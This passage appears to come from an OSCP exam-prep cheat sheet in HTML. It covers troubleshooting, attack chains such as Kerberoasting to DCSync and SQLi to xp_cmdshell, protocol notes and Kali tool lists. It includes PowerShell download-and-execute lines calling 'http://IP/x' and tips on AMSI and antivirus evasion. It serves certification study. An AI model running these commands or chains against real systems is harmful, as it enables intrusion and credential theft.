+<p>FIX: correct LHOST, common port, base64/URL-encode, try sh/python/nc, use bind shell or webshell. IF STILL: pivot to expose your listener.</p>
+<h3 id="v8-http-works-in-browser-but-curl-fails">HTTP works in browser but curl fails<a class="anchor" href="#v8-http-works-in-browser-but-curl-fails">#</a></h3>
+<p>CAUSES: needs <code>Host:</code> header (vhost), cookie/session, User-Agent filter, TLS/redirect.</p>
+<p>CHECKS: <code>curl -v</code>; compare headers; add <code>-H &quot;Host: name&quot;</code>, <code>-b cookie</code>, <code>-A ua</code>, <code>-L</code>, <code>-k</code>.</p>
+<p>FIX: replicate the browser request (copy as curl from Burp/DevTools).</p>
+<h3 id="v8-exploit-crashes-errors">Exploit crashes / errors<a class="anchor" href="#v8-exploit-crashes-errors">#</a></h3>
+<p>CAUSES: Python2 vs 3, wrong version/arch/target index, missing deps, hardcoded IP.</p>
+<p>CHECKS: read the code; <code>python2 exploit.py</code>; check offsets/targets; deps.</p>
+<p>FIX: adjust LHOST/LPORT/target/paths; convert py2→py3; install deps. IF STILL: find alternate PoC or do the technique manually.</p>
+<h3 id="v8-exploit-works-locally-but-not-remotely">Exploit works locally but not remotely<a class="anchor" href="#v8-exploit-works-locally-but-not-remotely">#</a></h3>
+<p>CAUSES: firewall/egress, different arch/patch level, path assumptions, timing/race.</p>
+<p>FIX: check egress, match target build, adjust paths, add sleeps/retries.</p>
+<h3 id="v8-python-version-mismatch">Python version mismatch<a class="anchor" href="#v8-python-version-mismatch">#</a></h3>
+<p><code>print x</code> → py2. Run with <code>python2</code>, or fix syntax (<code>print()</code>, <code>.encode()</code>, <code>urllib</code>).</p>
+<h3 id="v8-smb-authentication-failure">SMB authentication failure<a class="anchor" href="#v8-smb-authentication-failure">#</a></h3>
+<p>CAUSES: wrong domain/format, null disabled, SMBv1 only, signing.</p>
+<p>CHECKS: <code>-d DOMAIN</code> / <code>DOMAIN/user</code>; <code>--local-auth</code>; <code>client min protocol=NT1</code>.</p>
+<p>FIX: correct account type; PtH <code>-H</code>; different exec method.</p>
+<h3 id="v8-kerberos-errors">Kerberos errors<a class="anchor" href="#v8-kerberos-errors">#</a></h3>
+<p><code>KRB_AP_ERR_SKEW</code> → <code>sudo ntpdate $DC</code>. <code>KDC_ERR_PREAUTH</code> → wrong pw / need pre-auth. <code>KDC_ERR_S_PRINCIPAL_UNKNOWN</code> → wrong SPN/host (use hostname not IP, add to <code>/etc/hosts</code>). Use FQDN + <code>-k</code>.</p>
+<h3 id="v8-bloodhound-problems">BloodHound problems<a class="anchor" href="#v8-bloodhound-problems">#</a></h3>
+<p>Collection fails → clock skew, wrong <code>-ns</code>/<code>-d</code>, LDAP signing → try <code>-c DCOnly</code>. Import fails → collector/GUI version mismatch.</p>
+<h3 id="v8-winrm-authentication-problems">WinRM authentication problems<a class="anchor" href="#v8-winrm-authentication-problems">#</a></h3>
+<p><code>nxc winrm</code> ok but <code>evil-winrm</code> fails → user not in Remote Management Users; TLS on 5986 (<code>-S</code>); clock skew (Kerberos) → use <code>-u/-p</code> NTLM.</p>
+<h3 id="v8-ssh-problems">SSH problems<a class="anchor" href="#v8-ssh-problems">#</a></h3>
+<p>&quot;Permission denied (publickey)&quot; → wrong user/key. Old cipher → <code>-oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa</code>. Key perms → <code>chmod 600</code>.</p>
+<h3 id="v8-tty-problems">TTY problems<a class="anchor" href="#v8-tty-problems">#</a></h3>
+<p>Ctrl-C kills shell / no arrows → do the full <code class="tag">[SHELL-STABILIZE]</code> (python pty + <code>stty raw -echo; fg</code> + <code>export TERM=xterm</code> + <code>stty rows/cols</code>).</p>
+<h3 id="v8-file-transfer-failure">File transfer failure<a class="anchor" href="#v8-file-transfer-failure">#</a></h3>
+<p>→ <code class="tag">[FILETRANSFER-TROUBLESHOOTING]</code>: certutil blocked → curl.exe/bitsadmin/SMB; binary corrupt → <code>binary</code> mode; no egress → serve from target / base64.</p>
+<h3 id="v8-powershell-problems">PowerShell problems<a class="anchor" href="#v8-powershell-problems">#</a></h3>
+<p>AMSI/ExecutionPolicy blocks script → <code>powershell -ep bypass</code>; base64 <code>-enc</code>; download-and-exec in memory <code>IEX(New-Object Net.WebClient).DownloadString(&#x27;http://IP/x&#x27;)</code>; AV kills it → obfuscate / use <code>.NET</code>/nc.exe.</p>
+<h3 id="v8-hash-cracking-failure">Hash cracking failure<a class="anchor" href="#v8-hash-cracking-failure">#</a></h3>
+<p>CAUSES: wrong mode, malformed hash, pw not in wordlist.</p>
+<p>CHECKS: <code>hashid</code>; verify hash format (no username unless mode expects it); try rules (<code>best64</code>, <code>OneRule</code>) + bigger lists.</p>
+<p>FIX: right <code>-m</code>; <code>--username</code> to strip; targeted wordlist (company words). IF STILL: pw too strong → different vector.</p>
+<h3 id="v8-chisel-problems">Chisel problems<a class="anchor" href="#v8-chisel-problems">#</a></h3>
+<p>Client won&#x27;t connect → egress/port (use 443), server <code>--reverse</code>, arch mismatch. No traffic → proxychains <code>socks5 127.0.0.1 1080</code>, use <code>-sT -Pn</code>.</p>
+<h3 id="v8-ligolo-problems">Ligolo problems<a class="anchor" href="#v8-ligolo-problems">#</a></h3>
+<p>No traffic → <code>ip route add &lt;subnet&gt; dev ligolo</code> missing; session not started; agent cert (<code>-ignore-cert</code>). Reverse shell from internal won&#x27;t arrive → add ligolo listener to expose Kali.</p>
+<h3 id="v8-proxychains-problems">Proxychains problems<a class="anchor" href="#v8-proxychains-problems">#</a></h3>
+<p>Refused → SOCKS down/wrong port. Hang → SYN/UDP over SOCKS (use <code>-sT -Pn -n</code>). DNS → use IPs / <code>proxy_dns</code>.</p>
+<h3 id="v8-dns-problems">DNS problems<a class="anchor" href="#v8-dns-problems">#</a></h3>
+<p>Name won&#x27;t resolve → add to <code>/etc/hosts</code> (<code>$IP name.domain</code>). Zone transfer refused → try each NS, or brute subdomains.</p>
+<h3 id="v8-vhost-problems">Vhost problems<a class="anchor" href="#v8-vhost-problems">#</a></h3>
+<p>Same page for every Host → filter baseline with ffuf <code>-fs &lt;size&gt;</code> / <code>-fw &lt;words&gt;</code>; add real vhost to <code>/etc/hosts</code>; some apps need exact case/scheme.</p>
+<h3 id="v8-nmap-filtered-ports">Nmap filtered ports<a class="anchor" href="#v8-nmap-filtered-ports">#</a></h3>
+<p>Firewall/ICMP → <code>-Pn</code>, lower <code>--min-rate</code>, <code>-sT</code> through proxy; a single &quot;filtered&quot; port is usually not worth an hour.</p>
+<h3 id="v8-privilege-escalation-exploit-fails">Privilege escalation exploit fails<a class="anchor" href="#v8-privilege-escalation-exploit-fails">#</a></h3>
+<p>CAUSES: wrong kernel/build, compiled on wrong libc/arch, needs specific conditions.</p>
+<p>CHECKS: exact <code>uname</code>/<code>systeminfo</code> match; compile on target-matching env; read prerequisites.</p>
+<p>FIX: pick the right exploit/build; try the intended non-kernel vector first (kernel is last resort). IF STILL: re-enumerate — you likely missed an easier vector.</p>
+<hr>
+<h1 id="v8-[chain-]-attack-chains-with-the-reasoning-between-stages">[CHAIN-*] ATTACK CHAINS (with the reasoning between stages)<a class="anchor" href="#v8-[chain-]-attack-chains-with-the-reasoning-between-stages">#</a></h1>
+<h3 id="v8-[chain-web-ssh]-web-creds-ssh-linux-privesc">[CHAIN-WEB-SSH] Web → creds → SSH → Linux privesc<a class="anchor" href="#v8-[chain-web-ssh]-web-creds-ssh-linux-privesc">#</a></h3>
+<p>Web app leaks creds (config/LFI-read-source/DB dump) → <strong>reason:</strong> users reuse passwords → SSH in as that user → <code>sudo -l</code>/SUID → root. *Connective logic:* the web box and the OS user share a secret.</p>
+<h3 id="v8-[chain-smb-winrm]-smb-creds-winrm-windows-privesc">[CHAIN-SMB-WINRM] SMB → creds → WinRM → Windows privesc<a class="anchor" href="#v8-[chain-smb-winrm]-smb-creds-winrm-windows-privesc">#</a></h3>
+<p>Null/guest SMB share holds <code>unattend.xml</code>/GPP cpassword → decrypt → <strong>reason:</strong> valid domain/local cred → <code>nxc winrm</code> Pwn3d! → evil-winrm → <code>whoami /priv</code> SeImpersonate → Potato → SYSTEM.</p>
+<h3 id="v8-[chain-lfi-config-ssh]-web-lfi-config-creds-ssh">[CHAIN-LFI-CONFIG-SSH] Web → LFI → config → creds → SSH<a class="anchor" href="#v8-[chain-lfi-config-ssh]-web-lfi-config-creds-ssh">#</a></h3>
+<p><code>?page=</code> LFI → <code>php://filter</code> reads <code>config.php</code> → DB/user creds → <strong>reason:</strong> reuse → SSH → privesc. *Logic:* LFI&#x27;s value is often file-read, not RCE.</p>
+<h3 id="v8-[chain-sqli-foothold]-sqli-db-creds-service-auth-foothold">[CHAIN-SQLI-FOOTHOLD] SQLi → DB creds → service auth → foothold<a class="anchor" href="#v8-[chain-sqli-foothold]-sqli-db-creds-service-auth-foothold">#</a></h3>
+<p>SQLi dumps <code>users</code> table → crack/reuse a hash → <strong>reason:</strong> admin panel or SSH/SMB uses same cred → login → foothold. Or MSSQL SQLi → <code>xp_cmdshell</code> → shell directly.</p>
+<h3 id="v8-[chain-ad-kerberoast]-domain-user-kerberoast-crack-lateral-acl-da">[CHAIN-AD-KERBEROAST] Domain user → Kerberoast → crack → lateral → ACL → DA<a class="anchor" href="#v8-[chain-ad-kerberoast]-domain-user-kerberoast-crack-lateral-acl-da">#</a></h3>
+<p>Assumed-breach user → <code>GetUserSPNs</code> → crack service acct → <strong>reason:</strong> service acct is local admin on a host → secretsdump → BloodHound &quot;from owned&quot; shows <code>WriteDACL</code> to a DA-group member → grant GenericAll → shadow creds → that user has DCSync → <code>secretsdump</code> domain → PtH Administrator → own DC + members.</p>
+<h3 id="v8-[chain-asrep-spray]-user-list-as-rep-crack-spray-foothold">[CHAIN-ASREP-SPRAY] User list → AS-REP → crack → spray → foothold<a class="anchor" href="#v8-[chain-asrep-spray]-user-list-as-rep-crack-spray-foothold">#</a></h3>
+<p>No creds, just usernames → AS-REP roast a pre-auth-disabled user → crack → <strong>reason:</strong> spray reveals it&#x27;s admin somewhere → evil-winrm → privesc.</p>
+<h3 id="v8-[chain-pivot-internal]-foothold-pivot-internal-ad">[CHAIN-PIVOT-INTERNAL] Foothold → pivot → internal AD<a class="anchor" href="#v8-[chain-pivot-internal]-foothold-pivot-internal-ad">#</a></h3>
+<p>Root a DMZ host → discover <code>172.16.x</code> → <strong>reason:</strong> internal subnet has the DC → Ligolo route → BloodHound over the tunnel → standard AD chain to DA.</p>
+<h3 id="v8-[chain-snmp-creds]-snmp-process-args-creds-login">[CHAIN-SNMP-CREDS] SNMP → process args → creds → login<a class="anchor" href="#v8-[chain-snmp-creds]-snmp-process-args-creds-login">#</a></h3>
+<p><code>snmpwalk</code> shows a process run with <code>-p Password123</code> in args → <strong>reason:</strong> that&#x27;s a live service cred → login to the service/OS. *Logic:* UDP enum you almost skipped held the key.</p>
+<hr>
+<h1 id="v8-[tech-]-technology-encyclopedia">[TECH-*] TECHNOLOGY ENCYCLOPEDIA<a class="anchor" href="#v8-[tech-]-technology-encyclopedia">#</a></h1>
+<p>*(WHAT / HOW / WHY OSCP CARES / ENUMERATE / MISCONFIGS / ATTACKS / KEY CMDS / INTERESTING / TROUBLESHOOT / LEADS TO / RELATED)*</p>
+<h3 id="v8-[tech-http][tech-https]">[TECH-HTTP]/[TECH-HTTPS]<a class="anchor" href="#v8-[tech-http][tech-https]">#</a></h3>
+<p>WHAT: request/response web protocol; HTTPS = HTTP over TLS. WHY: #1 foothold surface. ENUM: <code>[WEB-*]</code>. MISCONFIG: dir listing, backups, verbose errors, default creds, exposed <code>.git</code>/<code>.env</code>. ATTACKS: all web vulns. INTERESTING: Server/X-Powered-By headers, cert SAN (vhosts), redirects. LEADS TO: RCE/creds. RELATED: PHP, Apache, Nginx, IIS.</p>
+<h3 id="v8-[tech-dns]">[TECH-DNS]<a class="anchor" href="#v8-[tech-dns]">#</a></h3>
+<p>WHAT: name↔IP + service records. WHY: zone transfer dumps internal names; AD SRV records reveal DCs. ENUM: <code>dig axfr</code>, <code>dnsrecon</code>, SRV lookups. MISCONFIG: AXFR to anyone. LEADS TO: vhosts, DC discovery. RELATED: AD, vhosts.</p>
+<h3 id="v8-[tech-smb]">[TECH-SMB]<a class="anchor" href="#v8-[tech-smb]">#</a></h3>
+<p>WHAT: Windows file/print sharing + IPC over 445. WHY: enum, cred validation, lateral movement, loot. ENUM: <code class="tag">[SMB-ENUM]</code>. MISCONFIG: null/guest, writable shares, signing off, GPP cpassword. ATTACKS: RID brute, PtH, psexec/wmiexec, relay, EternalBlue (old). LEADS TO: creds, shells, AD. RELATED: RPC, LDAP, Kerberos, NTLM.</p>
+<h3 id="v8-[tech-ldap]">[TECH-LDAP]<a class="anchor" href="#v8-[tech-ldap]">#</a></h3>
+<p>WHAT: directory access protocol = AD database over the wire. WHY: dump users/computers/ACLs; creds in <code>description</code>. ENUM: <code>ldapsearch</code>, <code>ldapdomaindump</code>, <code>nxc ldap</code>. MISCONFIG: anonymous bind, secrets in attributes. LEADS TO: full AD map, roast lists. RELATED: Kerberos, AD, BloodHound.</p>
+<h3 id="v8-[tech-kerberos]">[TECH-KERBEROS]<a class="anchor" href="#v8-[tech-kerberos]">#</a></h3>
+<p>WHAT: ticket-based AD auth (AS-REQ/TGT/TGS). WHY: Kerberoast/AS-REP without admin; PtT/Golden. ENUM: <code class="tag">[ENUM-KERBEROS]</code>. MISCONFIG: pre-auth disabled, weak service-account passwords, delegation. ATTACKS: Kerberoast, AS-REP, PtT, S4U, Golden/Silver. INTERESTING: SPNs, <code>DONT_REQ_PREAUTH</code>, delegation flags. TROUBLESHOOT: clock skew, FQDN/SPN naming. RELATED: LDAP, NTLM, AD.</p>
+<h3 id="v8-[tech-ntlm]">[TECH-NTLM]<a class="anchor" href="#v8-[tech-ntlm]">#</a></h3>
+<p>WHAT: challenge/response auth + the NT hash. WHY: PtH, relay, cracking NetNTLMv2. ENUM: capture via Responder; <code>secretsdump</code>. MISCONFIG: signing off (relay), NTLMv1. ATTACKS: PtH, relay, offline crack (<code>-m 5600</code>). RELATED: SMB, Kerberos.</p>
+<h3 id="v8-[tech-ssh]">[TECH-SSH]<a class="anchor" href="#v8-[tech-ssh]">#</a></h3>
+<p>WHAT: encrypted remote shell/tunnel. WHY: payoff foothold + pivoting. ENUM: banner, key auth. MISCONFIG: password auth + weak pw, reused/world-readable keys. ATTACKS: key reuse, tunneling (<code>-L/-R/-D</code>). RELATED: pivoting, Linux.</p>
+<h3 id="v8-[tech-ftp][tech-rdp][tech-winrm][tech-nfs][tech-snmp]">[TECH-FTP]/[TECH-RDP]/[TECH-WINRM]/[TECH-NFS]/[TECH-SNMP]<a class="anchor" href="#v8-[tech-ftp][tech-rdp][tech-winrm][tech-nfs][tech-snmp]">#</a></h3>
+<p>See <code class="tag">[ENUM-FTP]</code>, <code class="tag">[ENUM-RDP]</code>, <code class="tag">[ENUM-WINRM]</code>, <code class="tag">[ENUM-NFS]</code>, <code class="tag">[ENUM-SNMP]</code> — each covers what/why/enum/attacks/leads-to.</p>
+<h3 id="v8-[tech-sql]">[TECH-SQL]<a class="anchor" href="#v8-[tech-sql]">#</a></h3>
+<p>WHAT: relational DBs (MySQL/MSSQL/Postgres/SQLite). WHY: SQLi → data/creds/RCE; direct login → RCE. ENUM/ATTACK: <code>[SQLI-*]</code>, <code class="tag">[ENUM-MSSQL]</code> <code class="tag">[ENUM-MYSQL]</code> <code class="tag">[ENUM-POSTGRES]</code>. MSSQL <code>xp_cmdshell</code>, Postgres <code>COPY PROGRAM</code>, MySQL <code>FILE</code>. LEADS TO: creds, RCE.</p>
+<h3 id="v8-[tech-jwt]">[TECH-JWT]<a class="anchor" href="#v8-[tech-jwt]">#</a></h3>
+<p>WHAT: signed token (header.payload.signature). WHY: forge identity. ATTACKS: <code>alg:none</code>, weak-secret crack (<code>-m 16500</code>), RS/HS confusion, <code>kid</code>/<code>jku</code>. RELATED: web auth.</p>
+<h3 id="v8-[tech-php][tech-apache][tech-nginx][tech-iis]">[TECH-PHP]/[TECH-APACHE]/[TECH-NGINX]/[TECH-IIS]<a class="anchor" href="#v8-[tech-php][tech-apache][tech-nginx][tech-iis]">#</a></h3>
+<p>PHP: wrappers (<code>php://filter</code>, <code>data://</code>), LFI→RCE, weak type juggling (<code>==</code>), <code>phpinfo</code> leaks. Apache: <code>.htaccess</code>, mod_cgi (Shellshock), 2.4.49/.50 traversal. Nginx: alias traversal, misrouted <code>/</code>, off-by-slash. IIS: <code>.aspx</code>/<code>web.config</code> upload, app-pool identity (SeImpersonate), short-name (8.3) enum, WebDAV. LEADS TO: RCE/creds.</p>
+<h3 id="v8-[tech-ad]">[TECH-AD]<a class="anchor" href="#v8-[tech-ad]">#</a></h3>
+<p>WHAT: Windows domain directory (users/computers/policies/trusts). WHY: <strong>the 40-point exam set.</strong> ENUM/ATTACK: all <code>[AD-*]</code>. Mental model: creds → what they unlock (BloodHound) → move up → DCSync. RELATED: LDAP/Kerberos/NTLM/SMB.</p>
+<h3 id="v8-[tech-powershell]">[TECH-POWERSHELL]<a class="anchor" href="#v8-[tech-powershell]">#</a></h3>
+<p>WHAT: Windows shell/scripting. WHY: enum + exec + download. KEY: <code>-ep bypass</code>, <code>-enc</code>, <code>IEX(New-Object Net.WebClient).DownloadString(...)</code>, <code>Get-History</code>/PSReadline. WATCH: AMSI/logging. RELATED: Windows privesc, evil-winrm.</p>
+<h3 id="v8-[tech-linuxperms]">[TECH-LINUXPERMS]<a class="anchor" href="#v8-[tech-linuxperms]">#</a></h3>
+<p>WHAT: uid/gid, rwx, SUID/SGID/sticky, capabilities, sudoers. WHY: privesc lives here. KEY: <code>find -perm -4000</code>, <code>getcap</code>, <code>sudo -l</code>, <code>/etc/passwd|shadow|sudoers</code>. RELATED: <code class="tag">[LINUX-PRIVESC]</code>.</p>
+<h3 id="v8-[tech-tokens]">[TECH-TOKENS]<a class="anchor" href="#v8-[tech-tokens]">#</a></h3>
+<p>WHAT: Windows access tokens + privileges (SeImpersonate, SeBackup, SeDebug, etc.). WHY: privilege abuse → SYSTEM. KEY: <code>whoami /priv</code>, Potato attacks. RELATED: <code class="tag">[WINDOWS-TOKENS]</code>.</p>
+<hr>
+<h1 id="v8-[tool-]-toolbox-purpose-quick-key-flags-output-mistakes-when-when-not">[TOOL-*] TOOLBOX  (PURPOSE / QUICK / KEY FLAGS / OUTPUT / MISTAKES / WHEN / WHEN NOT)<a class="anchor" href="#v8-[tool-]-toolbox-purpose-quick-key-flags-output-mistakes-when-when-not">#</a></h1>
+<ul>
+<li><strong>nmap</strong> — port/service scan. <code>-p- --min-rate 2000</code>, <code>-sCV</code>, <code>-sU --top-ports</code>. Mistake: top-1000 only; trusting <code>-sV</code> guess. When not: through SOCKS (use <code>-sT</code>).</li>
+<li><strong>rustscan</strong> — fast port discovery → pipe to nmap. <code>-a IP -- -sCV</code>. When not: if nmap two-step is fine.</li>
+<li><strong>ffuf / feroxbuster / gobuster</strong> — content/vhost/param fuzzing. ffuf <code>-u .../FUZZ -w list -fs N</code>; ferox recursive by default. Mistake: no <code>-fs</code> baseline for vhosts; giant wordlists. </li>
+<li><strong>nikto</strong> — quick web misconfig sweep. Noisy; leads not proof.</li>
+<li><strong>whatweb / wafw00f</strong> — stack + WAF fingerprint.</li>
+<li><strong>burp (community)</strong> — intercept/repeat/decode; save requests for sqlmap <code>-r</code>. No active scanner in community.</li>
+<li><strong>curl / wget</strong> — request/transfer. <code>curl -v/-k/-L/-H/-b/-A</code>; <code>wget -r ftp://</code>.</li>
+<li><strong>nc / socat</strong> — listeners/shells/transfer. <code>nc -lvnp 443</code>; socat full TTY.</li>
+<li><strong>impacket</strong> — <code>psexec/wmiexec/smbexec/secretsdump/GetUserSPNs/GetNPUsers/mssqlclient/getTGT/getST/ntlmrelayx/lookupsid</code>. The AD swiss-army knife.</li>
+<li><strong>netexec (nxc) / crackmapexec</strong> — spray + enum + PtH across smb/winrm/ldap/mssql/rdp/ssh. <code>-u -p -H --shares --users --rid-brute --continue-on-success --local-auth</code>. Mistake: spraying past lockout.</li>
+<li><strong>enum4linux-ng</strong> — one-shot SMB/RPC/LDAP enum. <code>-A $IP</code>.</li>
+<li><strong>smbclient / rpcclient / ldapsearch</strong> — manual SMB/RPC/LDAP.</li>
+<li><strong>bloodhound / bloodhound-python / SharpHound</strong> — AD graph. <code>-c all</code>. Mistake: not marking Owned; version mismatch.</li>
+<li><strong>evil-winrm</strong> — Windows shell over WinRM. <code>-i -u -p</code> / <code>-H</code>; <code>upload/download</code>; <code>-s scripts</code>.</li>
+<li><strong>linpeas / winpeas / pspy / seatbelt / powerup</strong> — local enum. Read RED; verify manually; pspy catches crons.</li>
+<li><strong>searchsploit</strong> — offline Exploit-DB. <code>-m</code> copy, <code>-x</code> view, <code>-u</code> update. Read before running.</li>
+<li><strong>msfconsole / msfvenom</strong> — <strong>exam: one target only.</strong> msfvenom for payloads (<code>-p ... -f exe/msi/aspx LHOST LPORT</code>). </li>
+<li><strong>hashcat / john</strong> — crack. hashcat <code>-m</code> mode + rules; john auto-detect. <code>ssh2john/zip2john/keepass2john</code>.</li>
+<li><strong>chisel / ligolo-ng / proxychains / ssh</strong> — pivoting (<code>[PIVOT-*]</code>).</li>
+<li><strong>certipy / bloodyAD / pywhisker / kerbrute</strong> — modern AD abuse (ADCS, ACL edits, shadow creds, user enum).</li>
+</ul>
+<hr>
+<h1 id="v8-[kali-toolbox]-every-exam-usable-kali-tool-by-phase-allowedbanned">[KALI-TOOLBOX]  🧰 every exam-usable Kali tool, by phase (+ allowed/banned)<a class="anchor" href="#v8-[kali-toolbox]-every-exam-usable-kali-tool-by-phase-allowedbanned">#</a></h1>
+<blockquote>Kali ships <strong>thousands</strong> of tools; you need <strong>~40</strong>. This is the exam-usable set grouped by *when you use it*, each with a one-line purpose. <strong>Legend:</strong> ✅ allowed freely · 1️⃣ Metasploit <strong>one-target-only</strong> · ⚠️ allowed <strong>with a caveat</strong> · ⛔ <strong>BANNED</strong> (see <code class="tag">[EXAM-RULES-2026]</code>). Verify against the current official guide. See installed tools: <code>apt list --installed 2&gt;/dev/null | grep &lt;name&gt;</code>, browse <code>/usr/share/</code>, or the Kali menu categories. 👉 To <strong>install/download</strong> these (apt + <code>~/tools</code> folder for winpeas/potatoes/chisel/ligolo), see **<code class="tag">[KALI-SETUP]</code>**. This section = *understand &amp; use*; that one = *install*.</blockquote>
+<h2 id="v8-1-port-scanning-host-discovery">1) Port scanning &amp; host discovery<a class="anchor" href="#v8-1-port-scanning-host-discovery">#</a></h2>
+<pre><code>✅ nmap        the one you live in — ports/services/versions/NSE scripts  [NMAP-QUICK]
+✅ rustscan    ultra-fast port find → pipes into nmap
+✅ masscan     very fast sweep (always re-verify hits with nmap -sCV)
+✅ arp-scan / netdiscover / fping   host discovery on an internal subnet (post-pivot)
+⛔ Nessus / OpenVAS / Nexpose       automated vuln scanners — BANNED</code></pre>
+<h2 id="v8-2-web-recon-content-discovery">2) Web — recon &amp; content discovery<a class="anchor" href="#v8-2-web-recon-content-discovery">#</a></h2>
+<pre><code>✅ whatweb / wafw00f     tech stack + WAF fingerprint
+✅ feroxbuster / ffuf / gobuster / dirb / dirsearch   directory &amp; file brute
+✅ ffuf / gobuster vhost + arjun / wfuzz              vhost &amp; hidden-parameter discovery
+✅ wpscan / joomscan / droopescan                     CMS-specific scanners
+✅ nikto                 quick misconfig/known-file sweep (leads, not proof)
+✅ curl / wget           manual requests, transfer, header/cookie testing</code></pre>
+<h2 id="v8-3-web-proxy-manual-exploitation">3) Web — proxy &amp; manual exploitation<a class="anchor" href="#v8-3-web-proxy-manual-exploitation">#</a></h2>
+<pre><code>✅ Burp Suite COMMUNITY   intercept/repeat/decoder/comparer (no active scanner)   ⛔ Burp PRO banned
+✅ OWASP ZAP              alt proxy
+✅ manual SQLi/LFI/RCE    do it by hand — [WEB-*] [SQLI-*]
+⛔ sqlmap / sqlninja / db_autopwn / browser_autopwn   auto-exploitation — BANNED, do SQLi MANUALLY</code></pre>
+<h2 id="v8-4-smb-rpc-ldap-service-enumeration">4) SMB / RPC / LDAP / service enumeration<a class="anchor" href="#v8-4-smb-rpc-ldap-service-enumeration">#</a></h2>
+<pre><code>✅ netexec (nxc) / crackmapexec   spray + enum + PtH across smb/winrm/ldap/mssql/rdp/ssh
+✅ smbclient / smbmap             list &amp; access shares
+✅ enum4linux-ng / enum4linux     one-shot SMB/RPC/LDAP enum
+✅ rpcclient / nbtscan / nmblookup   RPC user enum &amp; NetBIOS
+✅ ldapsearch / windapsearch / ldapdomaindump   LDAP/AD directory dump
+✅ snmpwalk / snmp-check / onesixtyone   SNMP loot
+✅ dig / dnsrecon / dnsenum        DNS + zone transfers
+✅ showmount / mount               NFS</code></pre>
+<h2 id="v8-5-active-directory-attack">5) Active Directory attack<a class="anchor" href="#v8-5-active-directory-attack">#</a></h2>
+<pre><code>✅ impacket-*   psexec/wmiexec/smbexec/atexec/dcomexec/secretsdump/GetUserSPNs/GetNPUsers/
+                getTGT/getST/ntlmrelayx/lookupsid/mssqlclient  — the AD swiss-army knife
+✅ bloodhound / bloodhound-python / SharpHound   the graph (find the path)
+✅ kerbrute            user enum + password spray over Kerberos
+✅ certipy             ADCS (ESC1–8) abuse
+✅ bloodyAD / pywhisker / owneredit / dacledit   ACL edits, shadow creds
+✅ Rubeus / PowerView / mimikatz / pypykatz      Windows-side Kerberos/creds
+✅ evil-winrm          WinRM shell (`-u -p` / `-H` PtH)
+⚠️ Responder / Inveigh   ANALYZE mode only (`-A`) — LLMNR/NBNS/WPAD POISONING (`-w`) is ⛔ BANNED
+⛔ mitm6/bettercap ARP·DNS spoofing   BANNED (spoofing)</code></pre>
+<h2 id="v8-6-password-attacks-cracking">6) Password attacks &amp; cracking<a class="anchor" href="#v8-6-password-attacks-cracking">#</a></h2>
+<pre><code>✅ hashcat / john      offline cracking (`-m` mode / rules; john auto-detects)
+✅ *2john              ssh2john / zip2john / keepass2john / office2john → crackable hashes
+✅ hydra / medusa      online brute (evidence + lockout-aware only; last resort)
+✅ netexec / kerbrute  password spraying (check --pass-pol first)
+✅ cewl / crunch       build custom wordlists
+✅ hashid / name-that-hash   identify a hash type
+✅ gpp-decrypt / LaZagne / mimikatz   recover stored creds</code></pre>
+<h2 id="v8-7-exploit-research-payloads">7) Exploit research &amp; payloads<a class="anchor" href="#v8-7-exploit-research-payloads">#</a></h2>
+<pre><code>✅ searchsploit        offline Exploit-DB (`-m` copy, `-x` view, `-u` update) — READ before running
+✅ msfvenom            payload generator (exe/elf/msi/aspx/war/dll/raw) — usable on ALL boxes
+✅ gcc / mingw-w64     compile/cross-compile exploits  [FIXING-EXPLOITS]
+✅ public PoCs (GitHub/EDB)   allowed if you understand + run them manually</code></pre>
+<h2 id="v8-8-metasploit-special-rules">8) Metasploit (special rules)<a class="anchor" href="#v8-8-metasploit-special-rules">#</a></h2>
+<pre><code>1️⃣ msfconsole modules (exploit/post) + Meterpreter   ONE target only; locks you to it; NOT for pivoting
+✅ msfvenom + exploit/multi/handler                   exempt — usable everywhere</code></pre>
+<h2 id="v8-9-shells-listeners-file-transfer">9) Shells, listeners &amp; file transfer<a class="anchor" href="#v8-9-shells-listeners-file-transfer">#</a></h2>
+<pre><code>✅ nc (netcat) / socat / ncat        listeners + shells (`nc -lvnp 443`; socat full TTY)
+✅ python3 -m http.server            serve files to targets
+✅ impacket-smbserver                SMB drop for Windows
+✅ certutil / bitsadmin / curl.exe   (on target) Windows downloads
+✅ powercat / Invoke-ConPtyShell     PS netcat + real Windows TTY
+✅ revshells.com (offline copy)      reverse-shell generator  [SHELL-REVSHELLS]</code></pre>
+<h2 id="v8-10-pivoting-tunneling">10) Pivoting &amp; tunneling<a class="anchor" href="#v8-10-pivoting-tunneling">#</a></h2>
+<pre><code>✅ ligolo-ng          cleanest pivot (routed interface, native tools)  [PIVOT-LIGOLO]
+✅ chisel             SOCKS/port-forward over HTTP  [PIVOT-CHISEL]
+✅ sshuttle / ssh -L/-R/-D   SSH-based pivots  [PIVOT-SSH]
+✅ proxychains(4)     run tools through a SOCKS proxy
+✅ plink / netsh portproxy   Windows-side forwarding</code></pre>
+<h2 id="v8-11-privilege-escalation-enumeration">11) Privilege-escalation enumeration<a class="anchor" href="#v8-11-privilege-escalation-enumeration">#</a></h2>
+<pre><code>✅ linpeas / winpeas         automated local enum (read RED; verify manually)
+✅ pspy                      catch cron/root processes (no root needed)
+✅ PowerUp / Seatbelt / PrivescCheck / JAWS   Windows privesc checks
+✅ accesschk / icacls        Windows permission checks
+✅ PrintSpoofer / GodPotato / JuicyPotatoNG / RoguePotato / SharpEfsPotato   SeImpersonate → SYSTEM
+✅ wesng / windows-exploit-suggester / linux-exploit-suggester   kernel-exploit leads
+✅ GTFOBins / LOLBAS (bookmarks)   binary-abuse references</code></pre>
+<h2 id="v8-12-wordlists-references-ship-with-kali">12) Wordlists &amp; references (ship with Kali)<a class="anchor" href="#v8-12-wordlists-references-ship-with-kali">#</a></h2>
+<pre><code>✅ /usr/share/wordlists/rockyou.txt   (gunzip once) · /usr/share/seclists/ · /usr/share/webshells/
+✅ dirb/dirbuster lists · nmap NSE scripts (/usr/share/nmap/scripts)</code></pre>
+<h2 id="v8-13-notes-screenshots-for-the-report">13) Notes &amp; screenshots (for the report)<a class="anchor" href="#v8-13-notes-screenshots-for-the-report">#</a></h2>
+<pre><code>✅ CherryTree / Obsidian / Sublime / vim   note-taking
+✅ Flameshot / gnome-screenshot / Greenshot   screenshots (flag + whoami/id + ip in ONE shot)
+✅ script / tmux   command logging + persistent sessions</code></pre>
